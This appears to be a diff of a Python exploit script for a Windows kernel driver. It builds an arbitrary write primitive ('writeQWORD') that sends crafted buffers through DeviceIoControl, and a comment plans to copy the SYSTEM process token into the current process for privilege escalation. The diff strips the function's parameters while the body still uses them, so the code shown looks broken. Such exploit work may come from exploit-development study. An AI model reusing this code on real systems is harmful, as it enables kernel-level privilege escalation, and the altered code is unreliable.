@@ -26,7 +26,7 @@ if dwStatus != STATUS_SUCCESS:
 	print("Something went wrong while allocating memory","e")
 	sys.exit()
 
-def writeQWORD(driver=None, what=None, where=None):
+def writeQWORD():
 	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
   	# Write the what value to what_addr
 	data = struct.pack("<Q", what)
@@ -57,7 +57,7 @@ def writeQWORD(driver=None, what=None, where=None):
 	triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
 	return triggerIOCTL
 
-# This is reserved for reading the offset token address.
+# This block is reserved for moving the token from the SYSTEM process to the CURRENT process.
 
 
 
